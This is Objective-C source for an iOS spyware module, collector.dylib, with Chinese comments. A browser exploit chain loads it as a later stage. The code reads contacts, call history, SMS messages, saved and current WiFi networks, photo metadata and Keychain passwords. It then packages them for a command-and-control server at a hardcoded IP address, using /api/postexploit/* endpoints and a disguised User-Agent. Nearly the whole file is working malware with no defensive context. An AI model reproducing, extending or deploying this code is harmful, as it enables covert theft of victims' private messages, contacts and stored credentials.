// collector.dylib — iOS 数据采集模块
// Stage3 加载后调用 _collect，采集联系人/短信/通话/WiFi/照片/Keychain
// 数据 POST 回 C2 的 /api/postexploit/* 端点

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <Security/Security.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// ─── sqlite3 types ────────────────────────────────────────────────────────

typedef struct sqlite3 sqlite3;
typedef int (*sqlite3_callback)(void *, int, char **, char **);
typedef int (*fn_sqlite3_open)(const char *, sqlite3 **);
typedef int (*fn_sqlite3_exec)(sqlite3 *, const char *, sqlite3_callback, void *, char **);
typedef int (*fn_sqlite3_close)(sqlite3 *);

static fn_sqlite3_open   _db_open  = NULL;
static fn_sqlite3_exec   _db_exec  = NULL;
static fn_sqlite3_close  _db_close = NULL;

static void load_sqlite(void) {
    void *h = dlopen("/usr/lib/libsqlite3.dylib", RTLD_NOW);
    if (!h) return;
    _db_open  = (fn_sqlite3_open)dlsym(h, "sqlite3_open");
    _db_exec  = (fn_sqlite3_exec)dlsym(h, "sqlite3_exec");
    _db_close = (fn_sqlite3_close)dlsym(h, "sqlite3_close");
}

// ─── Globals ──────────────────────────────────────────────────────────────

static NSString *g_uuid    = nil;
static NSString *g_baseURL = nil;

// ─── Raw socket HTTP (works in any thread context) ────────────────────────

static char g_host[256] = {0};
static int  g_port = 8782;

static void parseBaseURL(void) {
    const char *s = [g_baseURL UTF8String];
    if (strncmp(s, "http://", 7) == 0) s += 7;
    const char *colon = strchr(s, ':');
    const char *slash = strchr(s, '/');
    if (colon) {
        size_t hlen = colon - s;
        if (hlen >= sizeof(g_host)) hlen = sizeof(g_host) - 1;
        memcpy(g_host, s, hlen);
        g_host[hlen] = 0;
        g_port = atoi(colon + 1);
    } else if (slash) {
        size_t hlen = slash - s;
        if (hlen >= sizeof(g_host)) hlen = sizeof(g_host) - 1;
        memcpy(g_host, s, hlen);
        g_host[hlen] = 0;
        g_port = 80;
    } else {
        strncpy(g_host, s, sizeof(g_host) - 1);
        g_port = 80;
    }
}

static NSData *rawHTTP(const char *method, const char *path, const char *body, int bodyLen) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return nil;

    struct timeval tv = {10, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(g_port);
    inet_pton(AF_INET, g_host, &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return nil;
    }

    char header[1024];
    int hlen;
    if (body && bodyLen > 0) {
        hlen = snprintf(header, sizeof(header),
            "%s %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: %d\r\n"
            "User-Agent: MobileStore/1.0\r\n"
            "Connection: close\r\n\r\n",
            method, path, g_host, g_port, bodyLen);
    } else {
        hlen = snprintf(header, sizeof(header),
            "%s %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "User-Agent: MobileStore/1.0\r\n"
            "Connection: close\r\n\r\n",
            method, path, g_host, g_port);
    }

    send(sock, header, hlen, 0);
    if (body && bodyLen > 0) send(sock, body, bodyLen, 0);

    NSMutableData *respData = [NSMutableData data];
    char buf[4096];
    ssize_t n;
    while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) {
        [respData appendBytes:buf length:n];
    }
    close(sock);

    const char *raw = (const char *)[respData bytes];
    NSUInteger len = [respData length];
    const char *bodyStart = NULL;
    for (NSUInteger i = 0; i + 3 < len; i++) {
        if (raw[i] == '\r' && raw[i+1] == '\n' && raw[i+2] == '\r' && raw[i+3] == '\n') {
            bodyStart = raw + i + 4;
            break;
        }
    }
    if (bodyStart) {
        NSUInteger bodyOff = bodyStart - raw;
        return [respData subdataWithRange:NSMakeRange(bodyOff, len - bodyOff)];
    }
    return nil;
}

static NSData *httpPost(NSString *urlStr, NSData *body) {
    NSURL *url = [NSURL URLWithString:urlStr];
    NSString *path = [url path] ?: @"/";
    return rawHTTP("POST", [path UTF8String], (const char *)[body bytes], (int)[body length]);
}

// socket() is denied in the WebContent process by the sandbox.
// Collect everything into a dictionary, serialize at the end of collect(),
// and hand the buffer back to JS which exfiltrates over its working XHR channel.
static NSMutableDictionary *g_out = nil;

/* JS locates these through the dylib symtab and reads them directly. */
__attribute__((visibility("default"))) char g_outbuf[262144];
__attribute__((visibility("default"))) volatile int  g_outlen = 0;
__attribute__((visibility("default"))) volatile int  g_outstg = 0;

static void postJSON(NSString *endpoint, id jsonObj) {
    if (!endpoint || !jsonObj) return;
    if (!g_out) g_out = [NSMutableDictionary dictionary];
    g_out[endpoint] = jsonObj;
}

// ─── 1. Contacts (CNContactStore) ─────────────────────────────────────────

static int collectContacts(void) {
    void *fw = dlopen("/System/Library/Frameworks/Contacts.framework/Contacts", RTLD_NOW);
    if (!fw) return 0;

    Class CNContactStore = NSClassFromString(@"CNContactStore");
    Class CNContactFetchRequest = NSClassFromString(@"CNContactFetchRequest");
    if (!CNContactStore || !CNContactFetchRequest) return 0;

    id store = [[CNContactStore alloc] init];
    NSArray *keys = @[@"givenName", @"familyName", @"organizationName",
                      @"jobTitle", @"phoneNumbers", @"emailAddresses",
                      @"identifier"];

    id fetchReq = ((id (*)(id, SEL, id))objc_msgSend)(
        [CNContactFetchRequest alloc],
        @selector(initWithKeysToFetch:), keys);
    NSMutableArray *contacts = [NSMutableArray array];
    NSError *error = nil;

    @try {
        SEL enumSel = @selector(enumerateContactsWithFetchRequest:error:usingBlock:);
        if (![store respondsToSelector:enumSel]) return 0;

        void (^block)(id contact, BOOL *stop) = ^(id contact, BOOL *stop) {
            NSMutableDictionary *d = [NSMutableDictionary dictionary];
            d[@"device_uuid"] = g_uuid;

            NSString *given  = [contact valueForKey:@"givenName"] ?: @"";
            NSString *family = [contact valueForKey:@"familyName"] ?: @"";
            d[@"display_name"] = [NSString stringWithFormat:@"%@%@", family, given];
            d[@"organization"] = [contact valueForKey:@"organizationName"] ?: @"";
            d[@"job_title"]    = [contact valueForKey:@"jobTitle"] ?: @"";
            d[@"contact_id"]   = [contact valueForKey:@"identifier"] ?: @"";

            NSArray *phones = [contact valueForKey:@"phoneNumbers"];
            NSMutableArray *pl = [NSMutableArray array];
            for (id pv in phones) {
                id val = [pv valueForKey:@"value"];
                NSString *num = [val valueForKey:@"stringValue"] ?: @"";
                NSString *lbl = [pv valueForKey:@"label"] ?: @"other";
                [pl addObject:@{@"label": lbl, @"number": num}];
            }
            d[@"phone_numbers"] = pl;

            NSArray *emails = [contact valueForKey:@"emailAddresses"];
            NSMutableArray *el = [NSMutableArray array];
            for (id ev in emails) {
                NSString *addr = [ev valueForKey:@"value"] ?: @"";
                NSString *lbl  = [ev valueForKey:@"label"] ?: @"other";
                [el addObject:@{@"label": lbl, @"email": addr}];
            }
            d[@"emails"] = el;

            [contacts addObject:d];
        };

        ((void (*)(id, SEL, id, NSError **, void (^)(id, BOOL *)))objc_msgSend)
            (store, enumSel, fetchReq, &error, block);

    } @catch (NSException *e) {
        return 0;
    }

    if (contacts.count > 0) {
        postJSON(@"/api/postexploit/contacts", contacts);
    }
    return (int)contacts.count;
}

// ─── 2. Call History (sqlite — C callbacks) ───────────────────────────────

static NSMutableArray *g_call_arr = nil;

static int cb_calls(void *ud, int ncols, char **vals, char **cols) {
    NSMutableDictionary *d = [NSMutableDictionary dictionary];
    d[@"device_uuid"] = g_uuid;
    for (int i = 0; i < ncols; i++) {
        NSString *col = [NSString stringWithUTF8String:cols[i]];
        NSString *val = vals[i] ? [NSString stringWithUTF8String:vals[i]] : @"";
        if ([col isEqualToString:@"ZADDRESS"])
            d[@"phone_number"] = val;
        else if ([col isEqualToString:@"ZDURATION"])
            d[@"duration"] = @([val intValue]);
        else if ([col isEqualToString:@"ZCALLTYPE"]) {
            int t = [val intValue];
            d[@"call_type"] = (t == 1) ? @"incoming" : (t == 8) ? @"outgoing" : @"missed";
        }
        else if ([col isEqualToString:@"ZNAME"])
            d[@"contact_name"] = val;
    }
    [g_call_arr addObject:d];
    return 0;
}

static int collectCalls(void) {
    if (!_db_open || !_db_exec || !_db_close) return 0;

    NSArray *paths = @[
        @"/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
        @"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
    ];

    for (NSString *path in paths) {
        if (![[NSFileManager defaultManager] fileExistsAtPath:path]) continue;

        sqlite3 *db = NULL;
        if (_db_open([path UTF8String], &db) != 0 || !db) continue;

        g_call_arr = [NSMutableArray array];
        _db_exec(db,
            "SELECT ZADDRESS, ZDURATION, ZCALLTYPE, ZNAME "
            "FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 100",
            cb_calls, NULL, NULL);
        _db_close(db);

        if (g_call_arr.count > 0) {
            postJSON(@"/api/postexploit/calls", g_call_arr);
            int n = (int)g_call_arr.count;
            g_call_arr = nil;
            return n;
        }
    }
    g_call_arr = nil;
    return 0;
}

// ─── 3. SMS (sqlite — C callbacks) ───────────────────────────────────────

static NSMutableArray *g_sms_arr = nil;

static int cb_sms(void *ud, int ncols, char **vals, char **cols) {
    NSMutableDictionary *d = [NSMutableDictionary dictionary];
    d[@"device_uuid"] = g_uuid;
    d[@"is_read"] = @YES;
    d[@"is_sent"] = @NO;
    d[@"attachment_count"] = @0;
    for (int i = 0; i < ncols; i++) {
        NSString *col = [NSString stringWithUTF8String:cols[i]];
        NSString *val = vals[i] ? [NSString stringWithUTF8String:vals[i]] : @"";
        if ([col isEqualToString:@"id"])
            d[@"sender"] = val;
        else if ([col isEqualToString:@"text"])
            d[@"body"] = val;
        else if ([col isEqualToString:@"is_from_me"])
            d[@"is_sent"] = @([val intValue] == 1);
        else if ([col isEqualToString:@"is_read"])
            d[@"is_read"] = @([val intValue] == 1);
    }
    [g_sms_arr addObject:d];
    return 0;
}

static int collectSMS(void) {
    if (!_db_open || !_db_exec || !_db_close) return 0;

    NSArray *paths = @[
        @"/var/mobile/Library/SMS/sms.db",
        @"/private/var/mobile/Library/SMS/sms.db",
    ];

    for (NSString *path in paths) {
        if (![[NSFileManager defaultManager] fileExistsAtPath:path]) continue;

        sqlite3 *db = NULL;
        if (_db_open([path UTF8String], &db) != 0 || !db) continue;

        g_sms_arr = [NSMutableArray array];
        _db_exec(db,
            "SELECT h.id, m.text, m.is_from_me, m.is_read "
            "FROM message m "
            "LEFT JOIN handle h ON m.handle_id = h.ROWID "
            "WHERE m.text IS NOT NULL "
            "ORDER BY m.date DESC LIMIT 100",
            cb_sms, NULL, NULL);
        _db_close(db);

        if (g_sms_arr.count > 0) {
            postJSON(@"/api/postexploit/sms", g_sms_arr);
            int n = (int)g_sms_arr.count;
            g_sms_arr = nil;
            return n;
        }
    }
    g_sms_arr = nil;
    return 0;
}

// ─── 4. WiFi Networks (plist) ─────────────────────────────────────────────

static int collectWiFi(void) {
    NSMutableArray *networks = [NSMutableArray array];

    NSArray *paths = @[
        @"/var/preferences/SystemConfiguration/com.apple.wifi.plist",
        @"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
        @"/var/Keychains/com.apple.wifi.known-networks.plist",
        @"/private/var/Keychains/com.apple.wifi.known-networks.plist",
    ];

    for (NSString *path in paths) {
        if (![[NSFileManager defaultManager] fileExistsAtPath:path]) continue;

        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:path];
        if (!plist) continue;

        // com.apple.wifi.plist: "List of known networks" is an array
        NSArray *knownList = plist[@"List of known networks"];
        if ([knownList isKindOfClass:[NSArray class]]) {
            for (NSDictionary *net in knownList) {
                if (![net isKindOfClass:[NSDictionary class]]) continue;
                NSMutableDictionary *d = [NSMutableDictionary dictionary];
                d[@"device_uuid"]    = g_uuid;
                d[@"ssid"]           = net[@"SSID_STR"] ?: net[@"SSID"] ?: @"unknown";
                d[@"bssid"]          = net[@"BSSID"] ?: @"";
                d[@"security_type"]  = net[@"SecurityMode"] ?: @"unknown";
                d[@"is_saved"]       = @YES;
                d[@"is_current"]     = @NO;
                [networks addObject:d];
            }
        }

        // com.apple.wifi.known-networks.plist: dict keyed by SSID
        if (networks.count == 0) {
            for (NSString *key in plist) {
                id val = plist[key];
                if (![val isKindOfClass:[NSDictionary class]]) continue;
                NSDictionary *net = (NSDictionary *)val;
                NSMutableDictionary *d = [NSMutableDictionary dictionary];
                d[@"device_uuid"]    = g_uuid;
                d[@"ssid"]           = net[@"SSID"] ?: key;
                d[@"bssid"]          = net[@"BSSID"] ?: @"";
                d[@"security_type"]  = @"saved";
                d[@"is_saved"]       = @YES;
                d[@"is_current"]     = @NO;
                [networks addObject:d];
            }
        }

        if (networks.count > 0) break;
    }

    // Current WiFi via SystemConfiguration
    void *sc = dlopen("/System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration", RTLD_NOW);
    if (sc) {
        typedef CFPropertyListRef (*SCDynCopy)(void *, CFStringRef);
        SCDynCopy copyVal = (SCDynCopy)dlsym(sc, "SCDynamicStoreCopyValue");
        if (copyVal) {
            CFPropertyListRef val = copyVal(NULL, CFSTR("State:/Network/Interface/en0/AirPort"));
            if (val) {
                NSDictionary *info = (__bridge NSDictionary *)val;
                if (info[@"SSID_STR"]) {
                    NSMutableDictionary *d = [NSMutableDictionary dictionary];
                    d[@"device_uuid"]    = g_uuid;
                    d[@"ssid"]           = info[@"SSID_STR"];
                    d[@"bssid"]          = info[@"BSSID"] ?: @"";
                    d[@"security_type"]  = @"current";
                    d[@"is_current"]     = @YES;
                    d[@"is_saved"]       = @YES;
                    [networks addObject:d];
                }
                CFRelease(val);
            }
        }
    }

    if (networks.count > 0) {
        postJSON(@"/api/postexploit/wifi", networks);
    }
    return (int)networks.count;
}

// ─── 5. Photos (PHAsset metadata) ─────────────────────────────────────────

static int collectPhotos(void) {
    void *fw = dlopen("/System/Library/Frameworks/Photos.framework/Photos", RTLD_NOW);
    if (!fw) return 0;

    Class PHAsset = NSClassFromString(@"PHAsset");
    Class PHFetchOptions = NSClassFromString(@"PHFetchOptions");
    if (!PHAsset || !PHFetchOptions) return 0;

    NSMutableArray *photos = [NSMutableArray array];

    @try {
        id options = [[PHFetchOptions alloc] init];
        [options setValue:@30 forKey:@"fetchLimit"];

        // PHAssetMediaTypeImage = 1
        SEL fetchSel = @selector(fetchAssetsWithMediaType:options:);
        id result = ((id (*)(id, SEL, NSInteger, id))objc_msgSend)
                    ((id)PHAsset, fetchSel, (NSInteger)1, options);

        NSUInteger count = [(NSArray *)result count];
        for (NSUInteger i = 0; i < count && i < 30; i++) {
            id asset = ((id (*)(id, SEL, NSUInteger))objc_msgSend)
                       (result, @selector(objectAtIndex:), i);

            NSMutableDictionary *d = [NSMutableDictionary dictionary];
            d[@"device_uuid"] = g_uuid;

            NSString *fname = [asset valueForKey:@"filename"];
            d[@"file_name"] = fname ?: @"IMG.JPG";

            NSNumber *w = [asset valueForKey:@"pixelWidth"];
            NSNumber *h = [asset valueForKey:@"pixelHeight"];
            d[@"width"]  = w ?: @0;
            d[@"height"] = h ?: @0;

            NSDate *creation = [asset valueForKey:@"creationDate"];
            if (creation) {
                NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
                [fmt setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss"];
                d[@"date_taken"] = [fmt stringFromDate:creation];
            }

            [photos addObject:d];
        }
    } @catch (NSException *e) {
        return 0;
    }

    if (photos.count > 0) {
        postJSON(@"/api/postexploit/photos", photos);
    }
    return (int)photos.count;
}

// ─── 6. Keychain (SecItemCopyMatching) ────────────────────────────────────

static int collectKeychain(void) {
    void *secLib = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
    if (!secLib) return 0;

    typedef OSStatus (*SecItemCopyMatching_t)(CFDictionaryRef, CFTypeRef *);
    SecItemCopyMatching_t secCopy = (SecItemCopyMatching_t)dlsym(secLib, "SecItemCopyMatching");
    if (!secCopy) return 0;

    NSMutableArray *items = [NSMutableArray array];

    // Generic passwords
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll,
    };

    CFTypeRef result = NULL;
    OSStatus status = secCopy((__bridge CFDictionaryRef)query, &result);
    if (status == 0 && result) {
        NSArray *entries = (__bridge_transfer NSArray *)result;
        for (NSDictionary *entry in entries) {
            NSMutableDictionary *d = [NSMutableDictionary dictionary];
            d[@"device_uuid"]  = g_uuid;
            d[@"service"]      = entry[(__bridge id)kSecAttrService] ?: @"";
            d[@"account"]      = entry[(__bridge id)kSecAttrAccount] ?: @"";
            d[@"label"]        = entry[(__bridge id)kSecAttrLabel] ?: @"generic";
            d[@"access_group"] = entry[(__bridge id)kSecAttrAccessGroup] ?: @"";

            NSData *pwdData = entry[(__bridge id)kSecValueData];
            if (pwdData) {
                NSString *pwd = [[NSString alloc] initWithData:pwdData encoding:NSUTF8StringEncoding];
                d[@"password"] = pwd ?: @"<binary>";
            }
            [items addObject:d];
        }
    }

    // Internet passwords
    NSDictionary *inetQuery = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassInternetPassword,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll,
    };

    result = NULL;
    status = secCopy((__bridge CFDictionaryRef)inetQuery, &result);
    if (status == 0 && result) {
        NSArray *entries = (__bridge_transfer NSArray *)result;
        for (NSDictionary *entry in entries) {
            NSMutableDictionary *d = [NSMutableDictionary dictionary];
            d[@"device_uuid"]  = g_uuid;
            d[@"service"]      = [NSString stringWithFormat:@"inet:%@",
                                  entry[(__bridge id)kSecAttrServer] ?: @""];
            d[@"account"]      = entry[(__bridge id)kSecAttrAccount] ?: @"";
            d[@"label"]        = @"internet";
            d[@"access_group"] = entry[(__bridge id)kSecAttrAccessGroup] ?: @"";

            NSData *pwdData = entry[(__bridge id)kSecValueData];
            if (pwdData) {
                NSString *pwd = [[NSString alloc] initWithData:pwdData encoding:NSUTF8StringEncoding];
                d[@"password"] = pwd ?: @"<binary>";
            }
            [items addObject:d];
        }
    }

    if (items.count > 0) {
        postJSON(@"/api/postexploit/keychain", items);
    }
    return (int)items.count;
}

// ─── Entry: _collect ──────────────────────────────────────────────────────
// ctx: struct { const char *baseURL; const char *uuid; }

typedef struct {
    const char *baseURL;
    const char *uuid;
    char *out;        /* buffer provided by JS */
    int   outCap;     /* capacity in bytes */
    int   outLen;     /* filled by us: bytes written */
    int   pad;
} collect_ctx;

static void resolveIdentity(void) {
    NSData *resp = rawHTTP("GET", "/api/c2/whoami", NULL, 0);
    if (resp && [resp length] > 2) {
        NSDictionary *j = [NSJSONSerialization JSONObjectWithData:resp options:0 error:nil];
        if (j[@"uuid"] && ![j[@"uuid"] isEqual:@"unknown"]) {
            g_uuid = j[@"uuid"];
        }
    }
}

/* ---------- stepwise entry points: JS calls them one by one ---------- */
static int g_diag = 0;

__attribute__((visibility("default"))) int step0(void) {
    g_diag = 0;
    g_outstg = 10;
    if (!g_baseURL) g_baseURL = @"http://129.226.142.213";
    parseBaseURL();
    if (g_host[0]) g_diag |= 1;
    g_outstg = 11;
    return g_diag;
}

__attribute__((visibility("default"))) int step1(void) {
    g_outstg = 21;
    int ds = socket(AF_INET, SOCK_STREAM, 0);
    if (ds >= 0) { g_diag |= 2; close(ds); }
    g_outstg = 22;
    return g_diag;
}

__attribute__((visibility("default"))) int step2(void) {
    g_outstg = 31;
    int n = collectCalls();
    if (n > 0) { g_diag |= 16; }
    g_outstg = 32;
    return n;
}

__attribute__((visibility("default"))) int step3(void) {
    g_outstg = 41;
    int n = collectSMS();
    if (n > 0) { g_diag |= 32; }
    g_outstg = 42;
    return n;
}

__attribute__((visibility("default"))) int step4(void) {
    g_outstg = 51;
    int n = collectWiFi();
    if (n > 0) { g_diag |= 64; }
    g_outstg = 52;
    return n;
}

__attribute__((visibility("default"))) int step5(void) {
    g_outstg = 61;
    int n = collectKeychain();
    if (n > 0) { g_diag |= 256; }
    g_outstg = 62;
    return n;
}

__attribute__((visibility("default"))) int step9(void) {
    g_outstg = 90;
    NSMutableDictionary *pkg = [NSMutableDictionary dictionary];
    pkg[@"diag"] = @(g_diag);
    pkg[@"host"] = [NSString stringWithUTF8String:g_host];
    pkg[@"port"] = @(g_port);
    pkg[@"data"] = g_out ? g_out : [NSDictionary dictionary];
    NSData *j = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
    if (j) {
        int n = (int)[j length];
        int cp = (n < 262143) ? n : 262143;
        memcpy(g_outbuf, [j bytes], cp);
        g_outbuf[cp] = 0;
        g_outlen = cp;
    }
    g_outstg = 99;
    return g_outlen;
}

__attribute__((visibility("default")))
int collect(void *ctx) {
    // 诊断位图：bit0 host解析 bit1 socket bit2 connect
    //            bit3 contacts bit4 calls bit5 sms bit6 wifi bit7 photos bit8 keychain
    //            bit9 结果回传成功
    int diag = 0;
    g_outstg = 1;
    {
        const char *probe = "{\"probe\":1}";
        int pn = (int)strlen(probe);
        memcpy(g_outbuf, probe, pn);
        g_outbuf[pn] = 0;
        g_outlen = pn;
        diag |= 2048;
    }
    @autoreleasepool {
        if (ctx) {
            collect_ctx *c = (collect_ctx *)ctx;
            if (c->baseURL) g_baseURL = [NSString stringWithUTF8String:c->baseURL];
            if (c->uuid)    g_uuid    = [NSString stringWithUTF8String:c->uuid];
        }
        if (!g_baseURL) g_baseURL = @"http://129.226.142.213";
        parseBaseURL();
        if (g_host[0]) diag |= 1;

        {
            int ds = socket(AF_INET, SOCK_STREAM, 0);
            if (ds >= 0) {
                diag |= 2;
                struct sockaddr_in da;
                memset(&da, 0, sizeof(da));
                da.sin_family = AF_INET;
                da.sin_port = htons(g_port);
                inet_pton(AF_INET, g_host, &da.sin_addr);
                struct timeval tv = {5, 0};
                setsockopt(ds, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(ds, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                if (connect(ds, (struct sockaddr *)&da, sizeof(da)) == 0) diag |= 4;
                close(ds);
            }
        }

        if (!g_uuid || [g_uuid isEqualToString:@"unknown"]) {
            g_uuid = @"unknown";
            resolveIdentity();
        }

        load_sqlite();

        NSMutableDictionary *summary = [NSMutableDictionary dictionary];
        int n;

        /* deliberately empty: real work happens in step0..step9 */
        n = 0;


        summary[@"diag"] = @(diag);
        summary[@"host"] = [NSString stringWithUTF8String:g_host];
        summary[@"port"] = @(g_port);

        done_collecting:
        g_outstg = 2;
        {
            NSMutableDictionary *pkg = [NSMutableDictionary dictionary];
            pkg[@"summary"] = summary;
            pkg[@"data"] = g_out ? g_out : [NSDictionary dictionary];
            pkg[@"diag"] = @(diag);
            pkg[@"host"] = [NSString stringWithUTF8String:g_host];
            pkg[@"port"] = @(g_port);
            pkg[@"uuid"] = g_uuid ? g_uuid : @"";
            pkg[@"cnt"] = @([summary count]);
            NSData *j = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
            if (j) {
                int n = (int)[j length];
                int cp = (n < 262143) ? n : 262143;
                memcpy(g_outbuf, [j bytes], cp);
                g_outbuf[cp] = 0;
                g_outlen = cp;
                diag |= 1024;
            }
        }
        g_outstg = 3;
        return diag;
    }
}